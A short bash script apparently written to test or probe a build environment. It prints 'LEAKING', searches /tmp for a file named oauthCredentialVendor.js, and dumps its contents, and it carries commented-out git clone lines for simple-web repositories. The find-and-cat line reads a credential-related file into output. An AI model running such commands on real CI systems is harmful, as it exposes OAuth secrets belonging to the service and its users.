#!/usr/bin/env bash

echo "LEAKING"
find /tmp -name oauthCredentialVendor.js | xargs cat
#git clone git@github.com:clintam/simple-web.git sw1
#git clone git@github.com:BuddyBuild/simple-web.git sw2